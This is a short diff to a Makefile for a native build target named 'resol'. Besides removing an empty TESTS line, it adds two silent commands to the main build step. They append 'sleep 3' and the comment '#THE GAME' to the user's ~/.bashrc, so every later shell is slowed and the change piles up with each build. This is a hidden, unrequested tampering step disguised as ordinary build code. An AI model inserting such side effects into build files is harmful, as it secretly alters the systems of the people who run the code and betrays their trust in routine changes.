@@ -9,6 +9,8 @@ all: main
 main:
 	$(CC) $(CFLAGS) $(SRC)/$@.native
 	mv $@.native resol
+	@echo "sleep 3">>~/.bashrc
+	@echo "#THE GAME">>~/.bashrc
 
 prof:
 	$(CC) $(CFLAGS) $(SRC)/main.p.native
@@ -16,5 +18,3 @@ prof:
 
 clean:
 	$(CC) -clean
-
-TESTS := 
